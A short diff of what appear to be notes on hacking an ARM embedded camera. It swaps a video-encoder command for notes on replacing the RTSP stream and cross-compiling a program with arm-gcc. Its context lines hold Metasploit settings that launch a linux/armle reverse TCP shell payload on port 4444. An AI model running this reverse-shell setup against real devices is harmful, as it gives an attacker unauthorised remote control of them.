@@ -68,5 +68,9 @@ set PAYLOAD linux/armle/shell_reverse_tcp
 set LPORT 4444
 exploit # :)
 
-# Video fun
-/usr/sbin/fvideoencoder -i 2 -s 10 -d 0 -o 1 -h 2 -g 2 -l 0 -t 2 -j 1 -f 1 -x 1 -a 3 -b 40
+# Video fun (Replacing the RTSP Stream)
+
+
+# Compile our own software for the device
+#compile with arm-gcc:
+arm-linux-gnueabi-gcc -march=armv5te -mtune=arm926ej-s -msoft-float -mfloat-abi=soft -o helloworld helloworld.c
